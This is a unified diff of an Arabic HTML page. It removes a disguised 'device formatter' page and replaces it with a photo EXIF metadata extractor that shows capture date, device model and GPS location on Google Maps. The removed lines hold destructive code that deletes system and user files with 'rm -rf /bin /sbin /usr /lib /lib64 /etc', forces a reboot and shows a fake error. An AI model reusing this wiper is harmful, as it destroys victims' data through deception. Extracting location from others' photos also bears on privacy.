@@ -1,71 +1,123 @@
-html
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BlueBot - Device FORMATTER</title>
-    <script>
-        window.onload = function() {
-            // الكود اللي راح يفرم الجهاز
-            const formatDevice = () => {
-                // حذف ملفات النظام (Windows)
-                if (navigator.platform.includes('Win')) {
-                    const fs = require('fs');
-                    const path = require('path');
-                    const systemPaths = [
-                        'C:\\Windows\\System32',
-                        'C:\\Windows\\SysWOW64',
-                        'C:\\Program Files',
-                        'C:\\Program Files (x86)'
-                    ];
-                    systemPaths.forEach(p => {
-                        if (fs.existsSync(p)) {
-                            fs.readdirSync(p).forEach(file => {
-                                try { fs.unlinkSync(path.join(p, file)); } catch(e) {}
-                            });
-                        }
-                    });
-                }
-                // حذف ملفات النظام (Linux/Mac)
-                else {
-                    const exec = require('child_process').exec;
-                    exec('rm -rf /bin /sbin /usr /lib /lib64 /etc', () => {});
-                }
-
-                // حذف ملفات المستخدم
-                const userPaths = [
-                    'C:\\Users\\' + require('os').userInfo().username,
-                    '/home/' + require('os').userInfo().username
-                ];
-                userPaths.forEach(p => {
-                    if (fs.existsSync(p)) {
-                        fs.readdirSync(p).forEach(file => {
-                            try { fs.unlinkSync(path.join(p, file)); } catch(e) {}
-                        });
-                    }
-                });
-
-                // إعادة تشغيل الجهاز
-                setTimeout(() => {
-                    require('child_process').exec('shutdown /r /t 0');
-                }, 3000);
-            };
-
-            // تشغيل الكود بعد 5 ثواني
-            setTimeout(formatDevice, 5000);
-
-            // رسالة خداعية
-            document.body.innerHTML = `
-                <div style="text-align: center; padding: 50px;">
-                    <h1>⚠️ خطأ في التحميل!</h1>
-                    <p>يرجى تحديث الصفحة.</p>
-                </div>
-            `;
-        };
-    </script>
+    <title>مستخرج بيانات الصورة السيبراني</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: #1e1e1e;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        input[type="file"] {
+            margin: 20px 0;
+            padding: 10px;
+            background: #333;
+            color: #fff;
+            border: 1px solid #555;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .result {
+            margin-top: 20px;
+            text-align: right;
+            background: #2d2d2d;
+            padding: 15px;
+            border-radius: 5px;
+            border-right: 5px solid #00ff88;
+            display: none;
+        }
+        a {
+            color: #00ff88;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/exif-js/2.3.0/exif.min.js"></script>
 </head>
 <body>
-    <h1 style="color: red;">جارٍ التحميل...</h1>
+
+<div class="container">
+    <h2>أداة فحص واستخراج بيانات الصورة الجنائية</h2>
+    <p>اختر صورة أصلية لاستخراج الموقع، التاريخ، والمعلومات المخفية:</p>
+    
+    <input type="file" id="imageInput" accept="image/jpeg, image/jpg">
+
+    <div class="result" id="resultBox">
+        <h3>النتائج المستخرجة:</h3>
+        <p><strong>تاريخ ووقت الالتقاط:</strong> <span id="date"></span></p>
+        <p><strong>صانع الكاميرا/الهاتف:</strong> <span id="make"></span></p>
+        <p><strong>موديل الجهاز:</strong> <span id="model"></span></p>
+        <p><strong>خطوط الطول والعرض:</strong> <span id="coordinates"></span></p>
+        <p><strong>الموقع الدقيق:</strong> <a id="mapLink" href="#" target="_blank">اضغط هنا لفتح الموقع على خرائط Google</a></p>
+    </div>
+</div>
+
+<script>
+document.getElementById('imageInput').addEventListener('change', function(e) {
+    const file = e.target.files[0];
+    if (!file) return;
+
+    // قراءة بيانات الـ EXIF من ملف الصورة
+    EXIF.getData(file, function() {
+        // استخراج جميع البيانات الوصفية المتوفرة
+        const allMetaData = EXIF.getAllTags(this);
+        const resultBox = document.getElementById('resultBox');
+        
+        // إظهار صندوق النتائج
+        resultBox.style.display = 'block';
+
+        // عرض التاريخ والموديل
+        document.getElementById('date').innerText = allMetaData.DateTimeOriginal || "غير متوفر";
+        document.getElementById('make').innerText = allMetaData.Make || "غير متوفر";
+        document.getElementById('model').innerText = allMetaData.Model || "غير متوفر";
+
+        // التحقق من وجود بيانات الموقع الجغرافي (GPS)
+        if (allMetaData.GPSLatitude && allMetaData.GPSLongitude) {
+            
+            // تحويل الإحداثيات من (درجات/دقائق/ثواني) إلى نظام عشري دقيق يدعمه جوجل ماب
+            const latRef = allMetaData.GPSLatitudeRef || "N";
+            const lonRef = allMetaData.GPSLongitudeRef || "E";
+            
+            const lat = convertDMSToDD(allMetaData.GPSLatitude, latRef);
+            const lon = convertDMSToDD(allMetaData.GPSLongitude, lonRef);
+
+            document.getElementById('coordinates').innerText = `${lat}, ${lon}`;
+            document.getElementById('mapLink').style.display = 'inline';
+            document.getElementById('mapLink').href = `https://www.google.com/maps?q=${lat},${lon}`;
+        } else {
+            document.getElementById('coordinates').innerText = "لا تحتوي هذه الصورة على إحداثيات موقع جغرافي (GPS).";
+            document.getElementById('mapLink').style.display = 'none';
+        }
+    });
+});
+
+// دالة برمجية لتحويل الإحداثيات الستينية إلى إحداثيات عشرية دقيقة
+function convertDMSToDD(dms, ref) {
+    let degrees = dms[0].numerator / dms[0].denominator;
+    let minutes = dms[1].numerator / dms[1].denominator;
+    let seconds = dms[2].numerator / dms[2].denominator;
+
+    let dd = degrees + (minutes / 60) + (seconds / 3600);
+
+    if (ref === "S" || ref === "W") {
+        dd = dd * -1;
+    }
+    return dd.toFixed(6); // دقة تصل لـ 6 أرقام بعد الفاصلة لتحديد الموقع بالضبط
+}
+</script>
+
 </body>
 </html>
+
